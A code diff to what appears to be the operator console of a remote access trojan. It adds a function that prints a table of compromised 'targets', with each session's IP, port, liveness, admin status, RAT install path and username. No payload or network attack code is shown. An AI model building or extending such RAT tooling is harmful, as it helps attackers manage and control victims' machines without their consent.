@@ -2,9 +2,13 @@ from colorama import Fore,Style
 from subprocess import Popen
 from subprocess import PIPE
 from backports.pbkdf2 import pbkdf2_hmac
+from prettytable import PrettyTable
 
 import socket
 import binascii
+
+
+
 
 #CONSTANT:
 NB_SESSION = 0
@@ -96,6 +100,19 @@ def areYouSure():
         printColor("error","[-] Unknown argument.\n")
         return False
 
+
+def printAllTarget():
+    from .handler import Handler
+    #Print all target.
+    
+    ptable = PrettyTable() #Ascii tables dynamic.
+    ptable.field_names =["Session","IP","Port","Is he alive","Is he admin","Path RAT","Username"] #append title of row.
+
+    for key in Handler.dict_conn.keys():
+        #print("TETS BOOL_>",type(Handler.dict_conn[key][NB_ALIVE]),":",Handler.dict_conn[key][NB_ALIVE])
+        ptable.add_row([key,Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT],Handler.dict_conn[key][NB_ALIVE],Handler.dict_conn[key][NB_ADMIN],Handler.dict_conn[key][NB_PATH],Handler.dict_conn[key][NB_USERNAME]])
+
+        print(Fore.GREEN,(ptable),Fore.BLUE)
 
 def myBanner():
     return """
